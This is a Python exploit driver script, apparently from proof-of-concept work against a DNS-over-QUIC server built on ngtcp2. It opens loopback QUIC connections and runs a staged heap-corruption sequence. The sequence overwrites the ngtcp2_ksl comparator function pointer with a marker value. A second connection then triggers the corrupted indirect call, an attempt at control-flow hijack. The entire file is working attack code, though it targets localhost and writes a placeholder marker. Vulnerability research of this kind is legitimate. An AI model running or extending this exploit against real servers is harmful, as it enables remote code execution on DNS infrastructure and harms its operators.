#!/usr/bin/env python3
"""Attempt dispatch through the chosen-byte-overwritten ngtcp2_ksl comparator.

A second loopback QUIC connection is opened around the F5/F6 boundary so a
live ngtcp2_pktns may occupy the buf+6144 neighbour slot.  F6 still writes
ksl_marker.build_payload(): comparator = 0x4141414141414141 at slot1+0xa0.
Later streams on the second connection should drive ngtcp2_gaptr_push ->
ngtcp2_ksl_insert -> call [ksl->compar] if that pktns is the neighbour.

Usage: ksl_active.py PORT [before|after]
  before = open second connection before F1..F5
  after  = open second connection between F5 and F6 (default)
"""
import asyncio
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402

from ksl_marker import build_payload, MARKER  # noqa: E402


def _cfg():
    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = poc.ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 64 * 1024
    cfg.max_stream_data = 32 * 1024
    return cfg


async def _new_conn(host, port):
    cm = poc.connect(host, port, configuration=_cfg())
    proto = await cm.__aenter__()
    return cm, proto


async def _stream(proto, tag):
    sid = proto._quic.get_next_available_stream_id(False)
    await poc._flush(proto, sid, b"\x00\x04" + tag, fin=True)
    return sid


async def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
    when = sys.argv[2] if len(sys.argv) > 2 else "after"
    payload = build_payload()
    print("[driver] active-neighbour mode=%s marker=0x%016x port=%d"
          % (when, MARKER, port), flush=True)

    cm2 = proto2 = None
    async with poc.connect("127.0.0.1", port, configuration=_cfg()) as proto:
        if when == "before":
            cm2, proto2 = await _new_conn("127.0.0.1", port)
            await _stream(proto2, b"pre")
            print("[driver] second connection opened BEFORE F1..F5", flush=True)

        sid = proto._quic.get_next_available_stream_id(False)
        await poc._escalate(proto, sid)                       # F1..F5
        print("[driver] F5 done", flush=True)

        if when == "after":
            cm2, proto2 = await _new_conn("127.0.0.1", port)
            await _stream(proto2, b"pre")
            print("[driver] second connection opened AFTER F5", flush=True)

        await poc._flush(proto, sid, b"\xFF\xFF" + payload, fin=True)  # F6
        print("[driver] F6 fired", flush=True)

        if proto2 is not None:
            for i in range(6):
                await _stream(proto2, ("p%d" % i).encode())
                print("[driver] second-conn stream %d" % i, flush=True)
                await asyncio.sleep(0.25)

        # Also keep the attack connection alive and chatty.
        for i in range(2):
            s = proto._quic.get_next_available_stream_id(False)
            await poc._flush(proto, s, b"\x00\x04ping", fin=True)
            print("[driver] attack-conn stream %d" % i, flush=True)
            await asyncio.sleep(0.3)
        await asyncio.sleep(2.0)

    if cm2 is not None:
        try:
            await cm2.__aexit__(None, None, None)
        except Exception:
            pass
    print("[driver] done", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
